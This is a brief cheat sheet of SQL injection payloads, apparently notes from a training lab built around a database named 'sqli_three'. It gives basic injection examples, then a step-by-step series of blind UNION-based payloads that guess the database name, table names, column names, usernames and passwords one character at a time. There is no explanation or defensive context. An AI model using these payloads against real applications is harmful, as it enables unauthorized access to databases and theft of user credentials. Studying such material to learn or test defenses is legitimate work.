**Basic Injections:**

```
 SELECT * FROM DATABASE where NAME='admin'; 
```

```
 SELECT * from BLOG where ID=2;-- and PRIVATE=0 LIMIT 1; 
```


**Example of manual Enumeration:**
```
admin123' UNION SELECT 1;--

admin123' UNION SELECT 1,2,3;-- 

admin123' UNION SELECT 1,2,3 where database() like '%';--

admin123' UNION SELECT 1,2,3 where database() like 's%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

admin123' UNION SELECT 1,2,3 from users where username like 'a%

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
